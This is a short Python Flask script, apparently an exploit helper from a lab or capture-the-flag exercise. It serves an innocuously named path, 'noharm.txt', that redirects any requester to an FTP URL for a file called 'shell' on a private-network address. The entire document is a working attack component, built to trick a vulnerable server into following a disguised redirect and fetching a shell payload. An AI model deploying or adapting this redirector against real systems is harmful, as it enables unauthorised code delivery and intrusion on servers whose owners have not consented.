#!/usr/bin/env python

from flask import Flask, redirect

app = Flask(__name__)

@app.route("/noharm.txt")

def test():
	return redirect("ftp://192.168.79.173/shell")

if __name__ == "__main__":
	app.run(host="0.0.0.0",port=80)

